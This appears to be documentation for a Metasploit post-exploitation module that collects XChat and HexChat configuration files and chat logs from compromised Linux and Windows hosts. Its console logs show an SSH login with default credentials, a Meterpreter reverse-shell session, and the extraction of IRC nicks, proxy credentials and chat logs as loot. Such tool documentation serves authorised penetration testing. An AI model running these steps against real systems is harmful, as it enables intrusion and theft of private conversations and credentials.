## Vulnerable Application

This module enumerates the config and log files for XChat and HexChat.  XChat was retired in 2015, although the site and downloads
are still available in April 2020.  It was forked and replaced by HexChat.

Linux xchat path:

```
 /home/[username]/.xchat2/
   * /home/[username]/.xchat2/servlist_.conf
   * /home/[username]/.xchat2/xchat.conf
   * /home/[username]/.xchat2/xchatlogs/FreeNode-#aha.log
```

Linux hexchat path:

```
 /home/[username]/.config/hexchat/
   * /home/[username]/.config/hexchat/servlist.conf
   * /home/[username]/.config/hexchat/hexchat.conf
   * /home/[username]/.config/hexchat/logs/FreeNode/Freenode-#aha.log
```

## Verification Steps

  1. Install the application(s)
  2. Start msfconsole
  3. Get a shell
  4. Do: ```use post/multi/gather/enum_hexchat```
  5. Do: ```set session #```
  6. Do: ```run```
  7. You should get config and log files depending on your action

## Actions

### ALL

Download both config and chat logs.  Default.

### CHATS

Only download the chat logs.

### CONFIGS

Only download teh config files.

## Options

### HEXCHAT

Gather the files from HexChat. Default `true`.

### XCHAT

Gather the files from XCHat. Default `false`.

## Scenarios

### Hexchat 2.14.3 on Fedora 31

    ```
    [*] Processing xchat.rb for ERB directives.
    resource (xchat.rb)> use auxiliary/scanner/ssh/ssh_login
    resource (xchat.rb)> set username fedora
    username => fedora
    resource (xchat.rb)> set password fedora
    password => fedora
    resource (xchat.rb)> set rhosts 2.2.2.2
    rhosts => 2.2.2.2
    resource (xchat.rb)> run
    [+] 2.2.2.2:22 - Success: 'fedora:fedora' ''
    [*] Command shell session 1 opened (1.1.1.1:40023 -> 2.2.2.2:22) at 2020-04-22 07:17:59 -0400
    [*] Scanned 1 of 1 hosts (100% complete)
    [*] Auxiliary module execution completed
    resource (xchat.rb)> use post/linux/gather/enum_hexchat
    resource (xchat.rb)> set session -1
    session => -1
    resource (xchat.rb)> set verbose true
    verbose => true
    resource (xchat.rb)> run
    [!] SESSION may not be compatible with this module.
    [*] Detcted username: fedora
    [+] Downloading: /home/fedora/.config/hexchat/servlist.conf
    [+] Downloading: /home/fedora/.config/hexchat/hexchat.conf
    [+] IRC nick: test14123251232151
    [+] IRC nick1: test1251212123151
    [+] IRC nick2: test123123123
    [+] IRC nick3: test321321321
    [+] Proxy conf: 1.1.1.1:9999 -> proxyusername/proxypass
    [*] Downloading: /home/fedora/.config/hexchat//logs/freenode/freenode.log
    [*] Downloading: /home/fedora/.config/hexchat//logs/freenode/#postgresql.log
    [*] Downloading: /home/fedora/.config/hexchat//logs/freenode/#python-unregistered.log
    [*] Downloading: /home/fedora/.config/hexchat//logs/freenode/server.log
    [*] Downloading: /home/fedora/.config/hexchat//logs/NETWORK/server.log
    [+] servlist.conf saved as /home/h00die/.msf4/loot/20200422071815_default_2.2.2.2_hexchat.config_359863.txt
    [+] hexchat.conf saved as /home/h00die/.msf4/loot/20200422071816_default_2.2.2.2_hexchat.config_347758.txt
    [+] freenode.log saved as /home/h00die/.msf4/loot/20200422071816_default_2.2.2.2_hexchat.chatlogs_364082.txt
    [+] #postgresql.log saved as /home/h00die/.msf4/loot/20200422071816_default_2.2.2.2_hexchat.chatlogs_991489.txt
    [+] #python-unregistered.log saved as /home/h00die/.msf4/loot/20200422071816_default_2.2.2.2_hexchat.chatlogs_760685.txt
    [+] server.log saved as /home/h00die/.msf4/loot/20200422071816_default_2.2.2.2_hexchat.chatlogs_022702.txt
    [+] server.log saved as /home/h00die/.msf4/loot/20200422071816_default_2.2.2.2_hexchat.chatlogs_433357.txt
    [*] Post module execution completed
    ```

### Hexchat 2.14.2 and XChat 2.8.9 on Windows 10

    ```
    [*] Processing xchat_win.rb for ERB directives.
    resource (xchat_win.rb)> use exploit/multi/handler
    resource (xchat_win.rb)> set payload windows/meterpreter/reverse_tcp
    payload => windows/meterpreter/reverse_tcp
    resource (xchat_win.rb)> set lhost 1.1.1.1
    lhost => 1.1.1.1
    resource (xchat_win.rb)> set lport 8888
    lport => 8888
    resource (xchat_win.rb)> run
    [*] Started reverse TCP handler on 1.1.1.1:8888 
    [*] Sending stage (180291 bytes) to 3.3.3.3
    [*] Meterpreter session 1 opened (1.1.1.1:8888 -> 3.3.3.3:51475) at 2020-04-22 10:30:29 -0400
    
    meterpreter > background
    [*] Backgrounding session 1...
    resource (xchat_win.rb)> use post/multi/gather/enum_hexchat
    resource (xchat_win.rb)> set session -1
    session => -1
    resource (xchat_win.rb)> set xchat true
    xchat => true
    resource (xchat_win.rb)> set verbose true
    verbose => true
    msf5 post(multi/gather/enum_hexchat) > rexploit
    [*] Reloading module...
    
    [!] SESSION may not be compatible with this module.
    [+] Downloading: C:\Users\IEUser\AppData\Roaming\X-Chat 2\servlist_.conf
    [+] Downloading: C:\Users\IEUser\AppData\Roaming\X-Chat 2\xchat.conf
    [+] IRC nick: IEUser
    [+] IRC nick1: IEUser
    [+] IRC nick2: IEUser_
    [+] IRC nick3: IEUser__
    [*] Downloading: C:\Users\IEUser\AppData\Roaming\X-Chat 2\\xchatlogs\ChatJunkies-#xchat.log
    [*] Downloading: C:\Users\IEUser\AppData\Roaming\X-Chat 2\\xchatlogs\ChatJunkies-.log
    [*] Downloading: C:\Users\IEUser\AppData\Roaming\X-Chat 2\\xchatlogs\ChatJunkies-ChatJunkies.log
    [*] Downloading: C:\Users\IEUser\AppData\Roaming\X-Chat 2\\xchatlogs\ChatJunkies-server.log
    [*] Downloading: C:\Users\IEUser\AppData\Roaming\X-Chat 2\\xchatlogs\NETWORK-server.log
    [+] servlist_.conf saved as /home/h00die/.msf4/loot/20200422103218_default_3.3.3.3_xchat.config_408737.txt
    [+] xchat.conf saved as /home/h00die/.msf4/loot/20200422103218_default_3.3.3.3_xchat.config_505296.txt
    [+] C:\Users\IEUser\AppData\Roaming\X-Chat 2\\xchatlogs\ChatJunkies-#xchat.log saved as /home/h00die/.msf4/loot/20200422103218_default_3.3.3.3_xchat.chatlogs_472281.txt
    [+] C:\Users\IEUser\AppData\Roaming\X-Chat 2\\xchatlogs\ChatJunkies-.log saved as /home/h00die/.msf4/loot/20200422103218_default_3.3.3.3_xchat.chatlogs_133017.txt
    [+] C:\Users\IEUser\AppData\Roaming\X-Chat 2\\xchatlogs\ChatJunkies-ChatJunkies.log saved as /home/h00die/.msf4/loot/20200422103218_default_3.3.3.3_xchat.chatlogs_238039.txt
    [+] C:\Users\IEUser\AppData\Roaming\X-Chat 2\\xchatlogs\ChatJunkies-server.log saved as /home/h00die/.msf4/loot/20200422103218_default_3.3.3.3_xchat.chatlogs_482558.txt
    [+] C:\Users\IEUser\AppData\Roaming\X-Chat 2\\xchatlogs\NETWORK-server.log saved as /home/h00die/.msf4/loot/20200422103218_default_3.3.3.3_xchat.chatlogs_379409.txt
    [+] Downloading: C:\Users\IEUser\AppData\Roaming\HexChat\servlist.conf
    [+] Downloading: C:\Users\IEUser\AppData\Roaming\HexChat\hexchat.conf
    [+] IRC nick: IEUser
    [+] IRC nick1: IEUser
    [+] IRC nick2: IEUser_
    [+] IRC nick3: IEUser__
    [*] Downloading: C:\Users\IEUser\AppData\Roaming\HexChat\\logs\freenode\#python-unregistered.log
    [*] Downloading: C:\Users\IEUser\AppData\Roaming\HexChat\\logs\freenode\.log
    [*] Downloading: C:\Users\IEUser\AppData\Roaming\HexChat\\logs\freenode\freenode.log
    [*] Downloading: C:\Users\IEUser\AppData\Roaming\HexChat\\logs\freenode\server.log
    [*] Downloading: C:\Users\IEUser\AppData\Roaming\HexChat\\logs\NETWORK\server.log
    [+] servlist.conf saved as /home/h00die/.msf4/loot/20200422103220_default_3.3.3.3_hexchat.config_618512.txt
    [+] hexchat.conf saved as /home/h00die/.msf4/loot/20200422103220_default_3.3.3.3_hexchat.config_765571.txt
    [+] C:\Users\IEUser\AppData\Roaming\HexChat\\logs\freenode\#python-unregistered.log saved as /home/h00die/.msf4/loot/20200422103220_default_3.3.3.3_hexchat.chatlogs_007334.txt
    [+] C:\Users\IEUser\AppData\Roaming\HexChat\\logs\freenode\.log saved as /home/h00die/.msf4/loot/20200422103220_default_3.3.3.3_hexchat.chatlogs_199140.txt
    [+] C:\Users\IEUser\AppData\Roaming\HexChat\\logs\freenode\freenode.log saved as /home/h00die/.msf4/loot/20200422103220_default_3.3.3.3_hexchat.chatlogs_988553.txt
    [+] C:\Users\IEUser\AppData\Roaming\HexChat\\logs\freenode\server.log saved as /home/h00die/.msf4/loot/20200422103220_default_3.3.3.3_hexchat.chatlogs_851506.txt
    [+] C:\Users\IEUser\AppData\Roaming\HexChat\\logs\NETWORK\server.log saved as /home/h00die/.msf4/loot/20200422103220_default_3.3.3.3_hexchat.chatlogs_819165.txt
    [*] Post module execution completed
    ```
